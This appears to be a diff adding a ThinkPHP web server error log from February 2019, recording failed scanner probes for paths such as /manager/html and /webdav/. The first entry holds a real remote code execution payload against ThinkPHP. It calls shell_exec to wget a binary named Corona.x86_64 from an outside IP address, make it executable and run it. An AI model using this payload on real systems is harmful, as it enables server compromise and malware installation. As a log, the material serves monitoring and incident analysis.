@@ -1,0 +1,24 @@
+[ 2019-02-03T05:35:39+08:00 ] 185.172.110.88 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://185.244.25.159/Corona.x86_64;%20chmod%20777%20Corona.x86_64;./Corona.x86_64%20thinkphp
+ERR: 非法操作:\think\app
+
+[ 2019-02-03T09:50:47+08:00 ] 82.209.201.182 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2019-02-03T12:49:37+08:00 ] 106.12.121.211 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2019-02-03T12:50:22+08:00 ] 106.12.121.211 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2019-02-03T20:31:10+08:00 ] 218.255.173.218 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2019-02-03T20:31:52+08:00 ] 218.255.173.218 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2019-02-03T21:07:00+08:00 ] 71.6.202.198 /ccvv
+ERR: 无法加载控制器:Ccvv
+
+[ 2019-02-03T22:00:15+08:00 ] 51.15.142.164 /config
+ERR: 无法加载控制器:Config
+
